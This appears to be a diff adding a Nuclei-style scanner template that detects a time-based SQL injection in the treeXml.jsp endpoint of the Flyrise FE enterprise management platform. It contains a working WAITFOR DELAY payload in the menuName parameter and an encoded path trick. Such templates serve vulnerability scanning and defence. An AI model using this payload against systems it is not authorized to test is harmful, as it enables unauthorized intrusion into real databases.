@@ -1,0 +1,33 @@
+id: poc-yaml-flyrise-fe-treexml-jsp-sqli
+info:
+  name: 飞企互联-FE 企业运营管理平台 treeXml.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:{{t1}}'--&type=function HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "没有权限访问"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
